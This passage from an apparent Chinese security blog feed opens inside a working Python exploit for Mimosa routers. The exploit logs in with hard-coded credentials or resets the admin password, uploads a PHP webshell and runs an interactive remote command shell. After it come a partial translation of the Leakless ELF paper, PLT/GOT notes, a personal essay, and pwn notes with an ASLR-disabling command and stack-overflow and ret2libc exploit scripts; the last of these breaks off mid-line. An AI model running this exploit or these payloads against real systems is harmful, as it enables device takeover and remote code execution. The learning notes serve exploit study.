class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Uploading the shell might have failed, retry?'</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            ch = raw_input(<span class="string">"Would you like to execute a semi interactive shell?(Y/N): "</span>)</span><br><span class="line">            <span class="keyword">if</span> ch.lower() == <span class="string">'y'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] Running an interactive command shell'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'\n\n[*] Use quit to exit\n[*] clean_up to remove the webshell\n[*] prefix commands with php to run php code'</span></span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    cmd = raw_input(<span class="string">"root@&#123;&#125;&gt; "</span>.format(self.url.split(<span class="string">'/'</span>)[<span class="number">2</span>])).strip()</span><br><span class="line">                    <span class="keyword">if</span> cmd == <span class="string">"quit"</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'[+] Exiting command shell.'</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">elif</span> cmd == <span class="string">'clean_up'</span>:</span><br><span class="line">                        cmd = encode(<span class="string">'system("rm -rf load_help.php &amp;&amp; echo __DONE__");'</span>)</span><br><span class="line">                        r = requests.post(self.url+<span class="string">'/help/load_help.php'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'p'</span>:cmd&#125;)</span><br><span class="line">                        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">'[+] Something went wrong while executing the command'</span></span><br><span class="line">                        <span class="keyword">elif</span> r.text.strip() == <span class="string">'__DONE__'</span>:</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">'[+] Exploit cleaned up, exit now please'</span></span><br><span class="line">                    <span class="keyword">elif</span> cmd.startswith(<span class="string">"php "</span>):</span><br><span class="line">                        r = requests.post(self.url+<span class="string">'/help/load_help.php'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'p'</span>:encode(cmd[<span class="number">4</span>:])&#125;)</span><br><span class="line">                        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">                            <span class="keyword">print</span> <span class="string">'[+] Execution Failed.'</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">print</span> r.text</span><br><span class="line">                    r = requests.post(self.url+<span class="string">'/help/load_help.php'</span>,verify=<span class="literal">False</span>,data=&#123;<span class="string">'p'</span>:encode(<span class="string">'system("'</span>+cmd.replace(<span class="string">'"'</span>,<span class="string">'\\"'</span>)+<span class="string">' 2&gt;&amp;1");'</span>)&#125;)</span><br><span class="line">                    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">                        <span class="keyword">print</span> <span class="string">'[+] Something went wrong while executing the command'</span></span><br><span class="line">                        <span class="keyword">print</span> r.status_code</span><br><span class="line">                        <span class="keyword">print</span> r.text</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">print</span> r.text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] Your shell should be at &#123;&#125;/help/load_help.php'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] use GET/POST parameter p to execute php code'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] Note the php code sent through p has to be base64 encoded'</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+] Command should be executed'</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Mimosa routers Authentication Bypass/Privilege Escalation/RCE exploit'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] Please choose operation:\n\t 1) Exploit RCE using hard coded credentials (best choice)\n\t 2) Exploit RCE by changing the admin password (Intrusive) '</span></span><br><span class="line">        ch = raw_input(<span class="string">'Choice&gt; '</span>)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">"1"</span>:</span><br><span class="line">            <span class="keyword">if</span>(self.get_version() == <span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Fingerprinting Failed, bailing'</span></span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(self.LoginMonitor() == <span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Failed to Login using hardcoded creds, Bailing'</span></span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line">            shell = raw_input(<span class="string">'[+] Would you Like to upload a shell? (If Not you\'ll be asked for a custom command)(Y\N): '</span>)</span><br><span class="line">            <span class="keyword">if</span> shell.strip().lower() == <span class="string">'y'</span>:</span><br><span class="line">                self.ExploitRCE()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.ExploitRCE(Shell=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">"2"</span>:</span><br><span class="line">            <span class="keyword">if</span>(self.get_version() == <span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Fingerprinting Failed, bailing'</span></span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(self.ChangeAdminPassword() == <span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Failed to change creds, Bailing'</span></span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span>(self.LoginAdmin() == <span class="literal">False</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] Failed to Login as admin, Bailing'</span></span><br><span class="line">                exit(<span class="number">0</span>);</span><br><span class="line">            shell = raw_input(<span class="string">'[+] Would you Like to upload a shell? (If Not you\'ll be asked for a custom command)(Y\N): '</span>)</span><br><span class="line">            <span class="keyword">if</span> shell.strip().lower() == <span class="string">'y'</span>:</span><br><span class="line">                self.ExploitRCE()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.ExploitRCE(Shell=<span class="literal">False</span>)    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: &#123;&#125; &lt;url&gt;'</span>.format(sys.argv[<span class="number">0</span>])</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    ex = MimosaExploit(sys.argv[<span class="number">1</span>])</span><br><span class="line">    ex.run()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Router security/IoT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文翻译-&#39;How the ELF Ruined Christmas&#39;</title>
      <link href="/2020/06/11/%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91-How-the-ELF-Ruined-Christmas/"/>
      <url>/2020/06/11/%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91-How-the-ELF-Ruined-Christmas/</url>
      
        <content type="html"><![CDATA[<h2 id="How-the-ELF-Ruined-Christmas"><a href="#How-the-ELF-Ruined-Christmas" class="headerlink" title="How the ELF Ruined Christmas"></a>How the ELF Ruined Christmas</h2><p>最近时间真的是不够用，下班回来挤挤时间来写下博客，督促督促自己。准备接下来定期翻译一些比较经典的论文，从旧至新！</p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>在过去的几十年里，计算机软件在经历攻击技术与内存错误检测与保护技术之间的军备竞赛。有效的缓解技术，如ASLR，大大增加了成功利用漏洞的难度。现在的漏洞利用有俩个阶段：第一阶段的信息泄漏来弄清楚内存布局，第二阶段进行真正的exp。然而因为内存损坏出现的原因范围比较广，从程序中搞清楚内存布局信息不总是可能的。</p><p>在这篇论文中，我们提出了一种技术，它可以使用动态加载器来直接识别关键函数的位置并调用它们而不需要借助于信息泄漏。我们发现了ELF标准和动态链接加载器设计实现中的存在的几个基本问题，可以用来解决和执行任意的库函数。通过这些，可以绕过一些安全缓解措施技术，包括部分和全部的RELRO，这些技术是专门设计来保护ELF数据结构不变攻击者篡改。我们实现了一个工具-Leakless，并针对不同的的动态加载器实现，以前的攻击技术和现实案例对其进行评估，来确定我们发现的影响性，在另一层面，Leakless为攻击者提供了可靠的，非侵入性的攻击，并且几乎很少触发入侵检测系统。</p><h3 id="1-引言"><a href="#1-引言" class="headerlink" title="1. 引言"></a>1. 引言</h3><p>自从1998年莫里斯蠕虫首次所利用的缓冲区溢出以来，内存损坏漏洞的预防，利用和缓解占用了安全研究员的网络犯罪者的大量时间，即使内存损坏漏洞在最近几年开始减少，经典的缓冲区溢出第三个最常见的软件漏洞形式，其他四个内存损坏漏洞填补了前25名。</p><p>长期以来内存损坏漏洞减少的主要原因是大量投入与预防与减轻这些漏洞的研究。具体来讲，许多缓解技术已经在两个主要领域被采用：系统层强化与应用程序强化（ASLR，NX位）。</p><p>具体来说，地址空间布局随机化(ASLR)通过将动态库放在内存中的一个随机位置(对于攻击者不知道)，导致攻击者需要分两个阶段进行利用。在第一阶段，攻击者必须使用一个信息泄露漏洞，利用这个漏洞，有关应用程序(及其库)的内存布局的信息被暴露出来，以识别代表安全关键功能(如system()库函数)的代码的地址。在第二阶段，攻击者使用控制流重定向漏洞将程序的控制流重定向到此功能。</p><p>然而，由于内存损坏发生的条件范围很广，从程序中检索这些信息并不总是有效的。例如，解析代码(例如解码图像和视频)中的内存损坏漏洞经常在没有与攻击者直接通信的情况下发生，从而排除了信息泄露的可能性。如果没有这些信息，使用当前技术对ASLR保护的二进制文件执行攻击通常是不可行的或不可靠的。</p><p>正如[36]中所指出的，尽管有加固应用程序和系统安全的竞赛，但应用程序二进制格式和使用它们的系统组件的一些鲜为人知的方面的安全性并没有受到太多的关注。我们特别关注动态加载器，它是操作系统用户空间组件，负责将二进制文件及其依赖的库加载到内存中。二进制文件使用动态加载器来支持解析导入的符号。有意思的是，这正是对加固应用程序的攻击者通过泄漏库的地址和内容试图重新创造的行为。</p><p>我们的观点是通过动态加载器的功能滥用来开发一种不需要利用信息泄漏漏洞的技术，我们的技术利用了动态加载器和ELF格式的通用设计中的问题来解析和执行任意的库函数，使我们能够成功地利用加固的应用程序而不需要信息泄露漏洞。任何库函数都可以通过这种技术执行，即使被利用的二进制文件没有使用它，只要它所驻留的库已经被加载。由于几乎每个二进制文件都依赖于C库，这意味着我们的技术允许我们执行关键安全函数，如system()和execve()，从而允许任意命令执行。我们还将展示可以重用特定于应用程序的库函数来执行复杂而隐秘的攻击。所提供的技术是可靠的、与架构无关的，并且不要求攻击者知道版本、内存布局、内容或任何其他关于正在讨论的库和库函数的无效信息。</p><p>我们在一个叫Leakless的原型工具中实现了我们的想法。要使用Leakess，攻击者必须拥有目标应用程序，并可以利用漏洞(劫持程序控制流程)。有了这些信息，Leakless可以自动构造一个利用，在不需要信息泄漏的情况下调用一个或多个有意思的关键库函数。</p><p>为了评估这个技术的影响范围，我们进行了几个不同发行版的Linux和FreeBSD调查，并且发现绝大多数的二进制文件的默认安装这些易受Leakless的攻击的分支版本，若存在一个内存损坏漏洞的目标二进制。我们还研究了应用于各种C库的动态加载器实现，发现其中大多数容易受到Leakless工具的影响。此外，我们还将展示了一种流行的缓解技术，即重定位只读(RELRO)，它可以保护库函数调用不被攻击者重定向，而Leakless完全可以绕过它。最后，我们比较了Leakless的ROP链和实现类似功能的编译器实现的ROP的长度。与现有技术相比，Leakless产生的ROP链要短得多，正如我们所展示的，这使得它与传统ROP编译器创建的类似攻击相比，可以被更广泛的利用。</p><p>综上所述，我们得出了以下结论：</p><ul><li>我们实现了一种新的、不依赖架构和平台的攻击，利用基于ELFbased系统中支持动态加载的固有功能，使攻击者能够在不存在信息泄露漏洞的情况下执行任意库函数。</li><li>我们详细说明并克服了针对不同动态加载器实现以及多种缓解技术(包括RELRO)的情况下实现系统的挑战</li><li>最后我们进行了深入的评估，包括对以前复杂的漏洞的案例研究，使我们的技术更易于管理，评估了几种不同的动态加载器实现的安全性，调查了我们的技术对不同操作系统配置的适用性，并测量了通过Leakless产生的ROP链长度的改进</li></ul><h3 id="2-相关工作-内存损坏军备竞赛"><a href="#2-相关工作-内存损坏军备竞赛" class="headerlink" title="2. 相关工作:内存损坏军备竞赛"></a>2. 相关工作:内存损坏军备竞赛</h3><p>内存损坏军备竞赛(即，防御者针对已知的利用技术实现对策，攻击者提出新的利用技术以绕过这些防御的过程）已经持续了几十年。虽然在[37]的其他地方已经记录了这种竞争的历史，但本节重点关注的是需要许多现代利用分为两个阶段的事件序列，即在攻击者可以实现任意代码执行之前需要一个信息泄漏内存布局的步骤。</p><p>早期的缓冲区溢出利用依赖于将二进制代码(称为shell代码)注入缓冲区，并覆盖堆栈上的返回地址以指向该缓冲区的能力。随后，当程序从当前函数返回时，执行将被重定向到攻击者的shell代码，攻击者将获得对程序的控制。</p><p>因此，安全研究人员引入了另一种缓解技术：NX位。NX位的作用是防止不应该包含代码(通常是堆栈)的内存区域被执行。</p><p>NX 促使攻击者适应代码重用的概念：使用程序中已经存在的函数(比如系统调用和安全关键库函数)来实现他们的目标。在return-into-libc 利用[30,39]中，攻击者将控制流直接重定向到敏感的libc函数(如system())，该函数带有执行恶意行为的适当参数，而不是使用注入的shell代码。</p><p>为了对抗这种技术，开发了一种名为地址空间布局随机化(ASLR)的系统级强化技术。当ASLR开启时，攻击者并不知道函数库的位置，实际上，程序的内存布局(库、堆栈和堆的位置)在每次执行时都是随机的。因此，攻击者不知道在库中的何处位置重定向控制流以执行特定的函数。更糟糕的是，即使攻击者能够确定这些信息，他仍然无法确定库中特定函数的位置，除非他拥有库的副本。因此，攻击者通常不得不泄露库本身的内容并解析代码来识别关键函数的位置。为了泄漏这些库，攻击者经常重用程序代码段中的小块代码(称为gadget)来泄漏内存位置。这些小工具通常通过将它们的地址写入堆栈并连续返回它们而组合在一起。因此，这种技术被称为面向返回编程(ROP)[35]。</p><p>ROP对攻击者而言是一个强大的工具。事实上，在许多二进制文件中都可以找到一组“图灵完整”的ROP gadget来使用，并且可以在ROP编译器的帮助下利用这些gadget来执行漏洞利用任务[34]。然而，由于它们的普遍性，根据漏洞的具体细节，ROP编译器倾向于生成较长的ROP链，这些ROP链“利用起来比较大”[22]。稍后，我们将说明，Leakless产生相对较短的ROP链，并且，依赖于当前的缓解措施，需要很少的gadget。此外，Leakless也可以在没有“图灵完整”的情况下使用。</p><p>在实际利用中,攻击者通常使用一个信息泄漏攻击泄漏的地址或内容库,然后使用这些信息来计算安全的库函数(如系统())的地址,最后发送第二个payload给有漏洞的应用程序将控制流重定向到所希望调用的函数。</p><p>事实上，我们观察到找到特定库函数地址的目标实际上已经由动态加载器实现了，它是一个操作系统组件，可以帮助解析动态符号，即动态加载器。（确定库函数的地址)。因此，我们意识到我们可以利用动态加载器来剔除掉信息泄露这一步骤，并巧妙的利用，这将在不需要信息泄露攻击的情况下工作。由于我们的攻击不需要信息泄露步骤，我们称之为Leakless。</p><p>使用动态加载器作为开发利用过程的一部分的概念在return-into-libc攻击的内容中被简要地探讨了[15,21,30]。然而，现有技术是非常情境化的[30]，依赖于平台，需要两个阶段的[21]，或者容易受到当前缓解技术的影响，比如RELRO[30]，我们将在以后的章节中讨论。另一方面，Leakless是一种单阶段、独立于平台的通用技术，并且能够在这种缓解存在的情况下发挥作用。在下一节中，我们将描述动态加载器是如何工作的，然后将展示如何滥用此功能来执行攻击。</p><h3 id="3-动态加载器"><a href="#3-动态加载器" class="headerlink" title="3.动态加载器"></a>3.动态加载器</h3><p>动态加载器是用户空间执行环境的一个组件，它有助于在启动时加载应用程序所需的库，并解析由库导出并由应用程序使用的动态符号(函数或全局变量)。在本节中，我们将描述动态符号解析如何在基于ELF二进制对象规范[33]的系统上工作。</p><p>ELF是几个类unix平台(包括GNU/Linux和FreeBSD)通用的标准格式，它的定义独立于任何特定的动态加载器实现。由于Leakless主要依赖于标准的ELF特性，它很容易适用于广泛的系统。</p><h4 id="3-1-ELF对象"><a href="#3-1-ELF对象" class="headerlink" title="3.1 ELF对象"></a>3.1 ELF对象</h4><p>应用程序包括一个主二进制ELF文件(可执行文件)和几个动态库(也是ELF格式)。每个ELF对象由segments组成，每个segment包含一个或多个sections。</p><p>每个section都有一个普遍意义。例如，.text部分包含程序的代码，.data部分包含它的可写数据(比如全局变量)，.rodata部分包含只读数据(比如常量和字符串)。sections列表以ELF Shdr结构数组的形式存储在ELF文件中。</p><p>注意，每个ELF结构有两个版本:一个版本用于32位的ELF二进制文件(如Elf32 Rel)，另一个版本用于64位的ELF二进制文件(如Elf64 Rel)。为了简单起见，我们忽略了这个细节，除非在与我们的讨论相关的特定情况下。</p><h4 id="3-2动态符号和重定位"><a href="#3-2动态符号和重定位" class="headerlink" title="3.2动态符号和重定位"></a>3.2动态符号和重定位</h4><p>在本节中，我们将对ELF符号解析中涉及的数据结构进行总结。图1给出了这些数据结构及其相互关系的概述。</p><p>ELF对象可以将符号导出到其他ELF对象，也可以从其他ELF对象中导入符号。符号表示函数或全局变量，并通过名称标识。每个符号由相应的Elf Sym结构描述。这个结构的实例包含.dynsym ELF部分，它包含以下与我们的工作相关的字段:</p><h3 id="3-论文原文"><a href="#3-论文原文" class="headerlink" title="3.论文原文"></a>3.论文原文</h3><p><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 论文翻译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解PLT与GOT</title>
      <link href="/2020/04/19/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PLT%E4%B8%8EGOT/"/>
      <url>/2020/04/19/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PLT%E4%B8%8EGOT/</url>
      
        <content type="html"><![CDATA[<p>首先，说起plt与got表，我们就得知道什么是plt与got表，它们是干什么用的？为什么会出现？是怎么工作的？接下来，我们来讨论下我们上面提到的这些问题！</p><h3 id="0x00-plt-amp-amp-got"><a href="#0x00-plt-amp-amp-got" class="headerlink" title="0x00 plt &amp;&amp; got ?"></a>0x00 plt &amp;&amp; got ?</h3><p>got: 使得代码地址无关，基本的思想就是把跟地址相关部分放在数据段里面。这样，我们把ELF的做法，在数据段里建立一个指向这些变量的指针数据全局偏移表(Global Offset Table)</p><p>plt:</p><h3 id="0x01-why"><a href="#0x01-why" class="headerlink" title="0x01 why?"></a>0x01 why?</h3><p>操作系统通常使用动态链接的方法来提高程序运行的效率。在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载，如果有函数并没有被调用，那么它就不会在程序生命中被加载进来。这样的设计就能提高程序运行的流畅度，也减少了内存空间。而且现代操作系统不允许修改代码段，只能修改数据段，那么GOT表与PLT表就应运而生。</p><h3 id="0x02-how-to-work"><a href="#0x02-how-to-work" class="headerlink" title="0x02 how to work?"></a>0x02 how to work?</h3>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔所感</title>
      <link href="/2020/04/13/%E9%9A%8F%E7%AC%94%E6%89%80%E6%84%9F/"/>
      <url>/2020/04/13/%E9%9A%8F%E7%AC%94%E6%89%80%E6%84%9F/</url>
      
        <content type="html"><![CDATA[<p>在返京隔离期间，（女盆友推荐）下班闲余挤出时间看了一部剧《梨泰院class》，看完觉得应该写点什么，对剧中的一些台词比较印象深刻。</p><p>“即使把我困在黑暗里，我也是独自发光的石头”</p><p>“每天都是都是心动的一天”</p><p>剧中我看到了一个在正直父亲港湾的护佑下，一个出生牛犊不怕虎的少年，可以完全按照自己的想法，也可以完全遵循自己的内心，但在一刹那间失去了父亲那座大山的庇佑，那个残酷的社会教他从一个小男孩到完完全全长大，教他懂得所谓的“人情世故”，教他人生应该是怎么样的，正如他自己每次回想到父亲问他酒是什么味道，从甜到苦…….再到人生。但是他好像从来都没有变过，对的东西不管到什么时候，依旧还是对的！</p><p>也看到了一个敢爱敢恨，正直帅气，很清楚也很了解自己需要的是什么，对自己的目标一直很坚定，坚持不懈的女孩子，并且一直陪在自己爱的人，为她着想。也看到了，甘于顶着不适在一个公司十多年，好像为的就是搜集证据，最后扳到。面对爱一个男生，两个女孩子的做法也是截然不同，当然结果不大一样。</p><p>最后我也看到了一个团队，一个齐心协力的团队所具有的力量。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零零散散</title>
      <link href="/2020/03/29/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/"/>
      <url>/2020/03/29/%E9%9B%B6%E9%9B%B6%E6%95%A3%E6%95%A3/</url>
      
        <content type="html"><![CDATA[<p>整理了下电脑，不知道什么时候零零散散的记录了这些东西，也舍不得删掉，就放到这记录记录吧</p><h2 id="零零"><a href="#零零" class="headerlink" title="零零"></a>零零</h2><h3 id="堆栈保护"><a href="#堆栈保护" class="headerlink" title="堆栈保护"></a>堆栈保护</h3><ol><li><p>关闭NX：代表着IP寄存器可以指向堆，栈了；</p></li><li><p>关闭PIE：代表着BSS段的地址是固定的，则可把shellcode写入bss段；</p></li><li><p>Stack:  如果开启的话会在栈中返回地址前放一个随机值，如果被覆盖，程序会报错；</p></li><li><p>ASLR：这个保护措施是由系统管理的，开启时，堆，栈与libc的地址会随机化。通过修改/proc/sys/kernel/randomize_va_space来控制ASLR启动与否，具体的选项有；</p><ul><li><p>关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同；</p></li><li><p>普通的 ASLR。栈基地址、mmap基地址、.so加载基地址都将被随机化，但是堆基地址没有随机化；</p></li><li><p>增强的ASLR，在 1 的基础上，增加了堆基地址随机化；</p><p>可以使用echo 0 &gt; /proc/sys/kernel/randomize_va_space关闭 Linux 系统的 ASLR</p></li></ul></li></ol><h3 id="栈溢出中比较重要的几个步骤"><a href="#栈溢出中比较重要的几个步骤" class="headerlink" title="栈溢出中比较重要的几个步骤"></a>栈溢出中比较重要的几个步骤</h3><ol><li>寻找危险函数，确定栈溢出的位置；</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：gets(),直接读取一行，忽略<span class="string">'\x00'</span></span><br><span class="line">     scanf() vscanf()</span><br><span class="line">输出：sprintf()</span><br><span class="line">字符串：strcpy(),字符串复制，遇到<span class="string">'\x00'</span>停止</span><br><span class="line"> strcat(),字符串拼接，遇到<span class="string">'\x00'</span>停止</span><br><span class="line"> bcopy（）</span><br></pre></td></tr></table></figure><ol start="2"><li><p>确定填充长度；<br>这一部分主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p><p> 1.相对于栈基地址的的索引，可以直接通过查看EBP相对偏移获得<br> 2.相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。<br> 3.直接地址索引，就相当于直接给定了地址。<br> 一般来说，我们会有如下的覆盖需求<br> 1.覆盖函数返回地址，这时候就是直接看 EBP 即可。<br> 2.覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。<br> 3.覆盖 bss 段某个变量的内容。<br> 4.根据现实执行情况，覆盖特定的变量或地址的内容。<br> 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p></li></ol><p>Demo:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+4h] [bp-14h]@1</span></span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的栈布局如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">             +-----------------+</span><br><span class="line">             |     retaddr     |</span><br><span class="line">             +-----------------+</span><br><span class="line">             |     saved ebp   |</span><br><span class="line">      ebp---&gt;+-----------------+</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">             |                 |</span><br><span class="line">s,ebp-0x14--&gt;+-----------------+</span><br></pre></td></tr></table></figure><p>对应的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#构造与程序交互的对象</span></span><br><span class="line">sh = process(<span class="string">'./stack_example'</span>)</span><br><span class="line">success_addr = <span class="number">0x0804843b</span></span><br><span class="line"><span class="comment">#构造payload</span></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x14</span> + <span class="string">'bbbb'</span> + p32(success_addr)</span><br><span class="line"><span class="keyword">print</span> p32(success_addr)</span><br><span class="line"><span class="comment">#向程序发送字符串</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#将代码交互转换为手工交互</span></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="comment">#`python -c 'print "A"*32+"\x90\x85\x04\x08"'`</span></span><br></pre></td></tr></table></figure><h3 id="栈溢出的利用"><a href="#栈溢出的利用" class="headerlink" title="栈溢出的利用"></a>栈溢出的利用</h3><ol><li><p>ret2text<code>(</code>ret2text`即控制程序执行程序本身已有的的代码(.text))</p></li><li><p>ret2shellcode</p><pre><code>ret2shellcode，即控制程序执行shellcod代码shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。在栈溢出的基础上，要想执行shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</code></pre></li><li><p>ret2syscall</p></li><li><p>ret2libc</p><p>下面demo来自b站君莫笑师傅</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">checksec ./ret2lib2</span><br><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line"></span><br><span class="line">exp的构造：</span><br><span class="line">cyclic 200</span><br><span class="line"><span class="variable">$cyclic</span> -l 0x62616164</span><br><span class="line">112</span><br><span class="line">//The starting of exp</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">p = process(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ret2libc2'</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*112 + p32(elf.plt[<span class="string">'gets'</span>])+<span class="string">'aaaa'</span>+ p32(elf.bss()+0x100)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; search <span class="string">"/bin/sh"</span></span><br><span class="line">libc-2.23.so    0xf7f56a0b das     /* <span class="string">'/bin/sh'</span> */</span><br><span class="line">只有这个，而libc的地址是随机的，实际运行的时候并不是这个地址，现在该怎么办？</span><br><span class="line">gets(&amp;s)</span><br><span 